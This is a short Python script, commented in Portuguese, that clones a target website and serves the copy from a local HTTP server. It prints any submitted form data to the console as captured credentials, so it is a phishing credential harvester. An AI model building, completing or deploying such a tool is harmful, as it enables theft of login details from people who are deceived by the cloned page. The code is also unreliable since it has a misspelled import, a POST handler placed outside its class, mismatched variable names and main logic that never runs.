# bibliotecas a serem importadas
import requests
from http.server import BaseHTTPResquestHandler , HTTPServer
import threading
import sys

#classe para o servidor HTTP
class MyRequestHandler(BaseHTTPResquestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        with open('cloned_page.html', 'r', encoding='utf-8') as file:
            self.wfile.write(file.read().encode('utf-8'))

#função para capturar as requisições POST usadas em formulários

def do_POST(self):
    content_length = int(self.headers['Content-Length'])
    post_data = self.rfile.read(content_length)
    print(f" => CREDENCIAL:\n{post_data.decode('utf-8')}")
    self.send_response(200)
    self.send_header('Content-type', 'text/html')
    self.end_headers()
    self.wfile.write("error".encode('utf-8'))

# função para clonar a página e salvar em um arquivo HTML

def clone_and_save_page(url):
    response = requests.get(url)
    if response.status_code == 200:
        with open('cloned_page.html', 'w', encoding='utf-8') as file:
            file.write(response.text)

# função para iniciar o servidor HTTP e torná-lo acessível

def run_http_server(ip, port):
    server_adress = (ip, port)
    httpd = HTTPServer(server_address, MyRequestHandler)
    print(f'Server running at {ip}:{port}, serving content from cloned_page.html')
    httpd.serve_forever()

# definindo os argumentos

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Usage: python script.py <target_url> <server_ip> <server_port>")
        sys.exit(1)

        target_url = sys.argv[1]
        server_ip = sys.argv[2]
        server_port = int(sys.argv[3])
        clone_and_save_page(taarget_url)
        server_thread = threading.Thread(target=run_http_server, args=(server_ip, server_port))
        server_thread.start()
